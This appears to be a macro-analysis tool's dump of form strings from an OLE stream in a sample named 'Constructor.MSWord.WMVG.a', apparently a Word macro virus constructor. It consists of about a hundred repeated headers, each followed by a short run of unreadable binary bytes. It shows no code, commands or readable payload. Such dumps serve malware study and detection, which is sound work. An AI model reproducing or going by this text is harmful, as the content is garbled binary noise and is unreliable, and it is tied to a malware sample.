VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�CO��u
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���fR�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��e��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.7�A;�EO{d�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��mQ0��]�i�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
z���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
UX��.
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����O��Ʊ� 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
qO�u5���1UE���ď��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���Ze��� �
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8��_޷&�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;1h
�s���)�$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{P8�d���Y�w�}
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���R{j
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*��1�AR
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�<�e<�#L�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ݣ���n�#$S%��݄tRр
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.D̦��kx
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
qYc۷��2)L!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Un-�R���د
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"��C$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
� �ے�\�*��8�t��D�B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���1F[-����Ǹ

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
a�n�¨�Ÿ�|[oZ�}��(GBP�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�;���(��q`E\u��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
EZ��v��	TS!�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�+��q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
o^�u�
��i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�i���Or
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
pX�`�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@DM�^72�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
aL
Y.�j��za@��Z��#_

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[V���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
CQ�\%lHZm���)� 7��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���h��ڿv*�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
¤�g��*��2H
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
4�d��* N<B��In�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���[F��RI�r@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Gh[�jv'��)�'Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ѹN4�p<
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#!3UU�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��2G��4J
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�h:��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z�p�y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
o�)E�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r$�U�0*�U4$n:b�+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
s�)JV�8��)��A$/(�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H߃S�e��:���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
P{g%�Wu��b�T+�1
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�%G�o^
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 �Y�:
���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���1���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ͻ�x�&��e�^�	�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Zs?�nJ&]Ͳ�OV�Ւsb�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
R�b�Ũ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�c�lHC5��쌰90W�
(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
W��;u�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{��)�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��jѡ�EB���Đ���JEǻ)E�W
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&��2 �
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-ѕ>��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I)�Lrz©
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z�J�޵�̘�9P
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�d^A�����@|�d�
�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�fh�W�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�h*vQ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
4eP�4
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-�Þ2,.��J
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\�T֌
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�{mӾY(��5�Ng�!��Xu �d�|
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.�샹
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@NLD
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J�x��0��O]{
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
֨%Q�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��[���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ct��;3m��-*����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 � !��+YY�٠��^A(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�OR>.?��Yq-B �V���7�C4�-��ZO
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
O&�գ5[>8�{Pa.��٥Y�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��XĖ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��F���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�̊D��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�~��7��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���2a�a���ГLxd���4ҴHd{r��XP:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��_�b�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
w�}Ɲ*�0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�(x&CT�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
U]O�*�j
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ӵ�����FYL��,c���~���x��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�.줚�V��a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����1ze�����y�O�a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.���PXgb!"B��U�dB�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��*daÓa�F�66�
�n�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
T�ݕ�7"����n
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
U�M5���9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
F��
��T
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
4awD��|xUf��Y��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�FX�
��Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
FZ�3z��'
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��J����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�	2��y܇"C#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�d	�ϳ��iTWV�����[��i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���Q��`IąO,�,e��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�k�/&�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
_��
T}���J[�h�v�O
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#��1�*HO��O�«l
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�K����-�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
F`@��h~,B���]�"S��M��|�"�K�-�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ȹ%C}]�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Hj��w'��Qhu�/��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�l8�SN,k^M��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�n`�ܗo�
*
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Xԁޝ+�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�j|:�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��]p!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ӊ���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
t���S(&��Z�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�)SK^-����"���; �߱퍦�V�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Ҽ0��\
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�{�%�#�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
R�����#kH�b� 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
4
���I)D	�aL
-------------------------------------------------------------------------------
